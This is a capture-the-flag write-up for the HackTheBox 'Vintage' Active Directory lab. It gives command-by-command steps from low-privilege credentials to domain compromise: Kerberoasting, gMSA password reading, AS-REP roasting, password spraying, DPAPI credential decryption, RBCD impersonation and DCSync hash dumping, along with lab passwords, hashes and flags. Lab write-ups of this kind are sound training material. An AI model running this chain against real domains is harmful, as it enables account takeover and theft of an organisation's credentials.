---
title:  "Vintage (Hard)"
seo_title: "Writeup for the HackTheBox Vintage Machine"
date:   2025-04-26T10:01
categories: ['HackTheBox', 'Windows', 'Active-Directory']
---

![](/assets/images/headers/Vintage.png)

# Synopsis
Vintage is a hard difficulty Windows machine designed around an assumed breach scenario, where the attacker is provided with low-privileged user credentials. The machine features an Active Directory environment without ADCS installed, and NTLM authentication is disabled. There is a 'Pre-Created computer account', meaning the password is the same as the sAMAccountName of the machine account. The 'Domain Computer' organisational unit (OU) has a configuration allowing attackers to read the service account password, which has gMSA configured. After obtaining the password, the service account can add itself to a privileged group. The group has complete control over a disabled user. The attacker is supposed to restore the disabled user and set a Service Principal Name (SPN) to perform Kerberoasting. After recovering the password, the user account has reused the same password. The newly compromised user has a password stored in the Credential Manager. The user can add itself to another privileged group configured for Resource-Based Constrained Delegation (RBCD) on the Domain Controller, allowing the attacker to compromise it.

## Reconnaissance
For this machine we are given some initial credentials to authenticate (`P.Rosa:Rosaisbest123`) and the initial nmap scan already shows we are dealing with a Domain Controller.

```console
$ nmap -v 10.10.11.45 -oN vintage.nmap
Nmap scan report for 10.10.11.45
Host is up (0.016s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49674/tcp open  unknown
49685/tcp open  unknown
64230/tcp open  unknown
```

We start by checking our connection with NetExec.

```console
$ nxc smb 10.10.11.45 -u 'P.Rosa' -p 'Rosaisbest123'
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED
```

We get back the error `STATUS_NOT_SUPPORTED`. We can verify if Rosa is a valid user by running Kerbrute. I just made a small wordlist that included Rosa along with some default accounts.

```console
$ kerbrute userenum -d vintage.htb --dc 10.10.11.45 users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/31/24 - Ronnie Flathers @ropnop

2024/12/31 10:26:02 >  Using KDC(s):
2024/12/31 10:26:02 >   10.10.11.45:88

2024/12/31 10:26:02 >  [+] VALID USERNAME:       Administrator@vintage.htb
2024/12/31 10:26:02 >  [+] VALID USERNAME:       P.Rosa@vintage.htb
2024/12/31 10:26:02 >  Done! Tested 3 usernames (2 valid) in 0.025 seconds
```

We see that Rosa is indeed a valid user, so there is something odd going on here. Something else thats worth a try is doing further enumeration over LDAP. Using `ldapsearch`, we can try to get a list of all domain users.

```console
$ ldapsearch -H ldap://10.10.11.45 -x -b "DC=VINTAGE,DC=HTB" -D 'vintage\p.rosa' -w 'Rosaisbest123' '(objectClass=User)' "sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2

Administrator
Guest
DC01$
krbtgt
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

### Kerberos Authentication
After using some common queries over ldap, I decided to retry using NetExec with the `-k` flag which uses Kerberos as authentication protocol instead of NTLM (default). When dealing with Kerberos, you generally don't want to use IP addresses and use hostnames instead.

```console
$ nxc smb dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --shares
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\P.Rosa:Rosaisbest123
SMB         dc01.vintage.htb 445    dc01             [*] Enumerated shares
SMB         dc01.vintage.htb 445    dc01             Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01             -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01             ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01             C$                              Default share
SMB         dc01.vintage.htb 445    dc01             IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01             NETLOGON        READ            Logon server share
SMB         dc01.vintage.htb 445    dc01             SYSVOL          READ            Logon server share
```

The output looks better. The reason for the `STATUS_NOT_SUPPORTED` error is that NTLM authentication is disabled on the domain. Luckily NetExec can easily authenticate over Kerberos. I performed a Kerberoasting attack and found 3 machine hashes and one service account hash.

```console
$ GetUserSPNs.py vintage.htb/p.rosa -usersfile users.txt -outputfile kerberoast.hashes
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:Rosaisbest123
<SNIP>

$ hashcat -m 13100 kerberoast.hashes $ROCKYOU
```

Cracking those hashes with a standard `rockyou.txt` wordlist does not work. Then I proceeded to run BloodHound.

```console
$ nxc ldap dc01.vintage.htb -u P.Rosa -p Rosaisbest123 -k --bloodhound --dns-server 10.10.11.45 -c All
LDAP        dc01.vintage.htb 389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        dc01.vintage.htb 389    DC01             [+] vintage.htb\P.Rosa:Rosaisbest123
LDAP        dc01.vintage.htb 389    DC01             Resolved collection methods: group, localadmin, session, trusts
LDAP        dc01.vintage.htb 389    DC01             Using kerberos auth without ccache, getting TGT
LDAP        dc01.vintage.htb 389    DC01             Done in 00M 04S
LDAP        dc01.vintage.htb 389    DC01             Compressing output into /home/s3rp3nt/.nxc/logs/DC01_dc01.vintage.htb_2024-12-31_113029_bloodhound.zip
```

## Foothold
The first thing I found was that the computer account `FS01$` belongs to the `PRE-WINDOWS 2000` group. 

![](/assets/images/writeups/vintage/BH-FS01-Member.png)

### Pre-Created Computer
When a new computer account of this type is configured, its password is set based on its name (i.e. lowercase computer name). Let's verify if we can get a TGT by using the standard password for this computer account.

```console
$ getTGT.py vintage.htb/FS01$ -dc-ip 10.10.11.45

Password:fs01
[*] Saving ticket in FS01$.ccache
```

We managed to save the machine's TGT meaning this is indeed a valid password. Looking at the results from BloodHound again, this account can read the password for the GMSA `GMSA01$`. And the latter can also add itself it the `SERVICEMANAGERS` group.

![](/assets/images/writeups/vintage/BH-FS01.png)

### ReadGMSAPassword Abuse
There are several methods we can use to read this password, but the easiest method is to use `BloodyAD`. Again we need to do our authentication over Kerberos by using the TGT of `FS01$`.

```console
$ bloodyAD -k ccache=FS01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```
### GenericWrite Abuse
We got the NTLM hash and the Base64 encoded password. We again retreive the TGT of the GMSA account and add ourself to the `SERVICEMANAGERS` group.

```console
$ getTGT.py vintage.htb/GMSA01$ -dc-ip 10.10.11.45 -hashes ':a317f224b45046c1446372c4dc06ae53'

[*] Saving ticket in GMSA01$.ccache

$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 add groupMember SERVICEMANAGERS GMSA01$
[+] GMSA01$ added to SERVICEMANAGERS
```

Let's see what control this group has over other accounts.

![](/assets/images/writeups/vintage/BH-Servicemanagers.png)

My initial thought was to create shadow credentials for the accounts that we have control over, but the domain does not support PKINIT. Since we have full control over all these service accounts, another thing we can do is a targeted ASREPRoasting attack in order to crack the hashes. This can be done in `BloodyAD` by setting the `DONT_REQ_PREAUTH` flag.

```console
$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 add uac SVC_ARK -f DONT_REQ_PREAUTH
$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 add uac SVC_LDAP -f DONT_REQ_PREAUTH
$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 add uac SVC_SQL -f DONT_REQ_PREAUTH
```

When we now perform an ASREPRoast, we should get the hashes of all three accounts.

```console
$ GetNPUsers.py vintage.htb/p.rosa -usersfile users.txt -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password:
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User gMSA01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User FS01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Rossi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Verdi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Viola doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Neri doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User P.Rosa doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$svc_ldap@VINTAGE.HTB:34d78bfb83fd05ac07402163aae9fe3d$775d80923f67ec2ef0741fd18b3f0758764ebdad0711f800179c844ce64d117149874db4664b3a5fdb240ccd95192eea142b2c4b280a27d6ad7d80d56b4fda66a778bba9aef8a70415405500961cbef51af9bec5ffcecc9477a963dd2b2300f378beccf6dafd94a871ad44ad0eb076fa52148946da11d509196644732a678a17e8a32b4da648db22dd19e28a6ea4febd1aaf9a5830b5bb421b24be806a2d44b76a9bf7161239f080a5532cecab6f209019ea1e17fd425cd18b4cd4a7cf6c0d9a8a0d1b5423375f50a158fbd686e3e39f319528d5e939b96979b656b64820ac6354efd8766f944f09dd47
$krb5asrep$23$svc_ark@VINTAGE.HTB:9bcb4e2a1c6d1d742b1216a337217c76$401ee49a4ba4684ffe2a44fa2f3bf1c2a990be777ca62b84e3bb24d7a682480dcf8b58163c3d7d1a49b9c17851e858f5a3a5b668f3f338702bdd214b4ef42c383f487b3d53ac84e7921af216919ac1272aa1a6aa2a29521a9909dc77c863cb12c3b4795bc681b498fd503ff05311240323229aaee57fb290577d1fa16eb1f20b98a7532ceabe33ae8e305a12ba4c26a9dee9398a99615bb4fef58295b05167ee4233220a828a051796b65514643e66cf962792a5de6c960af20f604a036d8e8babc40db0ff91f60d530efe17b2ba5b19ada9f0db426fef63e28c2684bb949cb1d6ed98c572c7b1b80569
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We only get two hashes and see that the `svc_sql` account responds with a `KDC_ERR_CLIENT_REVOKED` error, meaning that this account is not activated. We can verify if the account is indeed disabled.

```console
$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 get search --filter "(objectClass=user)" --attr userAccountControl | grep svc_sql -A 1

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
userAccountControl: ACCOUNTDISABLE; NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; DONT_REQ_PREAUTH
```

### Restore Disabled Account

With our `GenericAll` rights, we can enable the account in order to get the hash.

```console
$ bloodyAD -k ccache=GMSA01$.ccache --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl

$ GetNPUsers.py vintage.htb/p.rosa -usersfile svc_accounts.txt -request -outputfile services.hashes
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Password: Rosaisbest123
$krb5asrep$23$svc_sql@VINTAGE.HTB:dc8a1a43c87f7cc2ecbb5257297c5e94$3cc8690b1ed9d58499e1ea15cd221df403ca8e996958bf07dde2c4b908b49e88ccccff7499e425fc18adb571ac27ade37e7689b24c17098b0fad4c1f06d58cc716a163d8c6fd5239b5d038664b3678c15e0618f764773d7a015175276189704ffa0705f7d9e2f1fcb9e9bdc4a150fcb177fab3362fcd056d5bd1f4dfd746c9d5f86edaa80b9d00e5642c1503ee75d0f92675416005c65804cec1d5019eacaf3f729f64b65fe78a24bce11ce15a29ff1d59c266893f9579d72f56de8db8c161696ea4a6b752e2c78ed019a683c3a5bacaa4188a35a122c74d1d953b61fbf89c82b51f020b16c5b58f1075
$krb5asrep$23$svc_ldap@VINTAGE.HTB:e6c79b7a07a29f9ac1b01304a6284b5c$909ef9d4c18e333496894114a6352be17a069b22150553135ad947f8a53e62b4d8d821e1445c2732d6d7cba63f3b5b7ea41af01fc2ec90e6629aa495ac928e10b728e6ed38aab07c619a4ba0138ee51b1bfbf81ebaa5c9714666a15cccb2d9395875e17aa5dc0e989d35e4bbe7aa715eb322bc0f547a8fddfe8fa67f3f1e067b8c0d7b7f61bc5d61c3d9c394f4f56becaf11c45e8e055a4f7faca72951e53b5bb3fd64cb59e7ad7bad8b2381a45c7d6c6202c6990ac6dcd751698ee0537eeb433828980c2c7ed8323e2354992f311d0cedecb6810c10024b6d28190c64ee29b1676c3cd10f2dc4f98af6
$krb5asrep$23$svc_ark@VINTAGE.HTB:b49fd1927a448d0d5e4f881ddce0bff4$c4d6bc491d09cb254a9f77c8e2f5ddc3a3b026e7de873b673b33e74c1cc7c7abbb39003f42c19cd3aa3b89a4184c696c3efc4386a37c832a59005da2eab5fcccef22de555e6407f1389b576503757debacad0bebfeac149ee90628e05a8ce410bac307565474156df4ca521e7d0d29a8e5d4f1e0cf4ade79a36597ecffab8c586b4a9e4a10831d595bcd61fb5068efe832ce5b836bd46ba56f495ea5150e73aa117212ab218de0c2f17083b02c48d627d67ad8a1e537eeba72dcf7f984fe762f86d7ca702f6d22e3caf27cfdab1f7498c28e3664311f482129eb6bf2a14a8c94ba185eeb5529b178dadf

$ hashcat services.hashes -m 18200 $ROCKYOU
```

## User
We are only able to crack the password for `svc_sql` which is `Zer0the0ne`. 

### Password Spraying
Well we got a password but the account is not of much use, so lets do some password spraying.

```console
$ nxc smb dc01.vintage.htb -u users.txt -p Zer0the0ne -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\DC01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\gMSA01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\FS01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_sql:Zer0the0ne
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_ldap account vulnerable to asreproast attack
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_ark account vulnerable to asreproast attack
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```

The password is also valid for the user `C.Neri`. This user is also part of the `Remote Management Users` group so this will be our initial access.

```console
$ getTGT.py vintage.htb/C.Neri -dc-ip 10.10.11.45

Password:Zer0the0ne
[*] Saving ticket in C.Neri.ccache

$ export KRB5CCNAME=C.Neri.ccache
$ evil-winrm -i dc01.vintage.htb -r vintage.htb

Info: Establishing connection to remote endpoint
Cannot find KDC for realm "VINTAGE.HTB"

Error: Exiting with code 1
```

### WinRM with Kerberos

When we attempt to connect via WinRM, we got an error that the KDC cannot be found. To fix this we need to edit our `/etc/krb5.conf` file as follows:

```console
$ cat /etc/krb5.conf
[libdefault]
        default_realm = VINTAGE.HTB

[realms]
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
        }

[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB
```

We can now login with Evil-WinRM and get the user flag.

```console
$ evil-winrm -i dc01.vintage.htb -r vintage.htb

*Evil-WinRM* PS C:\Users\C.Neri\Documents> cat ../Desktop/user.txt
39047a49c3aba32d093084d6f0bcb4ea
```

## Root
### DPAPI Credential Extraction
We can look for any stored credentials and try to extract them. The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. They are usually located at `C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID`. Lets have a look if our user has any credentials stored.

```powershell
*Evil-WinRM* PS C:\Users\C.Neri> gci -force AppData\Roaming\Microsoft\Credentials

Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

*Evil-WinRM* PS C:\Users\C.Neri> gci -force AppData\Roaming\Microsoft\Protect

Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          6/7/2024   1:17 PM                S-1-5-21-4024337825-2033394866-2055507597-1115
-a-hs-          6/7/2024   1:17 PM             24 CREDHIST
-a-hs-          6/7/2024   1:17 PM             76 SYNCHIST

*Evil-WinRM* PS C:\Users\C.Neri> gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Directory: C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred
```

We can download the credential file and masterkey to our local machine and use `dpapi.py` to extract them.

```console
$ dpapi.py masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a

$ dpapi.py credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description :
Unknown     :
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312 
```

We found a password for the user `c.neri_adm`. 

### RBCD Attack

![](/assets/images/writeups/vintage/BH-NERI-delegate.png)

This user is part of the `DELEGATEDADMINS` group. Members of this group have the `msds-AllowedToActOnBehalfOfOtherIdentity` attribute on the computer `DC01.VINTAGE.HTB`. We can use these privileges to execute a modified S4U2self/S4U2proxy abuse chain to impersonate any domain user to the target computer system and receive a valid service ticket "as" this user. However, in order to perform the attack we need to have access to an account with an SPN set.

The trick here is that the user `c.neri_adm` has `GenericWrite` over the `DELEGATEADMINS` group and from earlier we have full control over the service account `svc_sql`. Therefore we can add this account to the `DELEGATEADMINS` group and add a fake SPN to the account. By doing this we have all the requirements for a constrained delegation attack. Lets add the `svc_sql` user to the group, change the SPN and get their TGT.

```console
$ bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"
[+] SVC_SQL added to DELEGATEDADMINS

$ export KRB5CCNAME=C.Neri.ccache
$ bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/bleed" 
[+] SVC_SQL's servicePrincipalName has been updated

$ getTGT.py vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
```

In BloodHound the permissions will now look as follows:

![](/assets/images/writeups/vintage/BH-SQL-delegate.png)

With the TGT of `svc_sql` we can now perform a S4U2Self attack in order to impersonate `L.BIANCHI_ADM` since this user has complete control over the domain.

```console
$ export KRB5CCNAME=svc_sql.ccache
$ getST.py -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'  
[*] Impersonating L.BIANCHI_ADM
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

### DCSync

Now we can perform a DCSync attack and grab the root flag.

```console
$ export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
$ secretsdump.py -k dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb632ebd8c7df30094b6cea89cdf372be
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e41bb21e027286b2e6fd41de81bce8db:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
<SNIP>

$ wmiexec.py -k -no-pass vintage.htb/L.BIANCHI_ADM@dc01.vintage.htb -hashes :e41bb21e027286b2e6fd41de81bce8db
C:\> type C:\Users\Administrator\Desktop\root.txt
```
